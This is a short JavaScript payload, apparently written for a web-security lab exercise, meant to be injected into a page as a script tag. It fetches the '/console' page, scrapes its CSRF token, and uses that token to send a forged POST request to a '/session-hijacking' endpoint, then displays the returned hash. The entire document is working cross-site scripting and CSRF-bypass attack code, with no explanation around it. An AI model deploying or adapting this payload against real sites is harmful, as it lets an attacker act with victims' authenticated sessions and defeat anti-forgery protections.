<script>
  // Fetching the '/console' endpoint to get HTML content
  fetch('/console')
    .then(response => {
      if (!response.ok) {
        throw new Error('Network response was not ok');
      }
      return response.text();
    })
    .then(html => {
      window.gotYou = true; 

      const parser = new DOMParser();
      const doc = parser.parseFromString(html, 'text/html');
      const csrfToken = doc.querySelector('input[name="csrfmiddlewaretoken"]').value;
      
      // Verify we got the CSRF token, then use it to make a request
      if (csrfToken) {
        submitSessionHijacking(csrfToken); // Call function to perform the action with CSRF token
      } else {
        throw new Error('CSRF token not found');
      }
    })
    .catch(error => {
      console.error('Error:', error);
    });

  function submitSessionHijacking(csrfToken) {
    fetch('/session-hijacking/gyadav35', { 
      method: 'post', 
      headers: { 
        'X-CSRFToken': csrfToken // Use the dynamically obtained CSRF token
      } 
    })
    .then(response => {
      if (response.ok) return response.json();
      else throw new Error('Request failed');
    })
    .then(data => {
      const { hash } = data;
      document.querySelector('#sessionHijackingResult').innerHTML = hash; // Displaying the result
    })
    .catch(error => {
      console.error('Failed to submit session hijacking:', error);
    });
  }
</script>
